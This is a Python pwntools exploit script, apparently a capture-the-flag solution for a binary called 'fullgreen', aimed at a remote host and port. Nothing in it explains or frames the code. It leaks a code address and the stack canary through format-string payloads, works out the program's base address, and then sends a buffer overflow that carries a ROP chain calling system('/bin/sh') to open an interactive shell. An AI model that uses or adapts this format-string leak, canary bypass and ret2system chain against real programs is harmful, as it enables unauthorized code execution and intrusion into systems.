# coding: utf-8
from pwn import *
#p = process("./fullgreen")
p = remote("207.154.239.148", 1342)
p.recv()

payload1 = b"%77$p"
p.sendline(payload1)
p.recvuntil(b"Hello, ")
mainLeak = p.recvline()
mainLeak = int(mainLeak, 16)
mainOffset = 0x01379
base = mainLeak - mainOffset
print("Base: ", hex(base))

payload2 = b"%71$p"
p.sendline(payload2)
p.recvuntil(b"You like the ")
canary = p.recvuntil(b"\n")
print("Canary: ", canary)
canary = int(canary, 16)
p.recvline()

poprdiOffset = 0x01403
justretOffset = 0x0101a
binshOffset = 0x02008
poprdi = base + poprdiOffset
justret = base + justretOffset
binsh = base + binshOffset
elf = ELF("./fullgreen")
syscallOffset = elf.plt.system
syscall = base + syscallOffset

payload3 = 520*b"A" + p64(canary) + b"A"*8 + p64(poprdi) + p64(binsh) + p64(justret) + p64(syscall)
p.sendline(payload3)
p.interactive()
